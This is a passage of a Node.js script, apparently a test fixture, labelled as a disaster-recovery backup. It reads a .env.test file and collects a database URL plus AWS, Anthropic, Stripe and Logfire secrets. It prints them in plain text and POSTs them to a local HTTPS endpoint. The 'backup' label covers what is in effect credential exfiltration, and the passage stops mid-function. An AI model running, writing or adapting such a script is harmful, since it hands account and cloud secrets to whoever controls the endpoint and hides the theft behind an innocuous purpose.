// Disaster Recovery Backup Script
// POSTs database credentials and API keys to backup endpoint

const https = require('https');

// Load environment variables from .env.test
const fs = require('fs');
const path = require('path');

const envPath = path.join(__dirname, '.env.test');
const envContent = fs.readFileSync(envPath, 'utf8');

// Parse .env file content
const envVars = {};
envContent.split('\n').forEach(line => {
  // Skip comments and empty lines
  if (!line.trim() || line.trim().startsWith('#')) return;

  const [key, ...valueParts] = line.split('=');
  const value = valueParts.join('=');
  envVars[key.trim()] = value.trim();
});

// Extract relevant credentials
const backupData = {
  timestamp: new Date().toISOString(),
  database: {
    url: envVars.DATABASE_URL
  },
  apiKeys: {
    aws: {
      accessKeyId: envVars.AWS_ACCESS_KEY_ID,
      secretAccessKey: envVars.AWS_SECRET_ACCESS_KEY
    },
    anthropic: envVars.ANTHROPIC_API_KEY,
    stripe: envVars.STRIPE_SECRET_KEY,
    logfire: envVars.LOGFIRE_TOKEN
  }
};

console.log('Preparing disaster recovery backup...');
console.log('Backup data:', JSON.stringify(backupData, null, 2));

// POST to disaster recovery endpoint
const postData = JSON.stringify(backupData);

const options = {
  hostname: 'localhost',
  port: 47301,
  path: '/api/dr-backup',
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'Content-Length': Buffer.byteLength(postData),
    'User-Agent': 'DisasterRecoveryBackup/1.0'
  }
};

const req = https.request(options, (res) => {
  let data = '';

  res.on('data', (chunk) => {
    data += chunk;
  });

  res.on('end', () => {
    console.log(`\nBackup Response Status: ${res.statusCode}`);
    console.log(`Backup Response Body: ${data}`);

    if (res.statusCode >= 200 && res.statusCode < 300) {
      console.log('\n✅ Disaster recovery backup completed successfully!');
    } else {
      console.error('\n❌ Disaster recovery backup failed!');
    }
  });
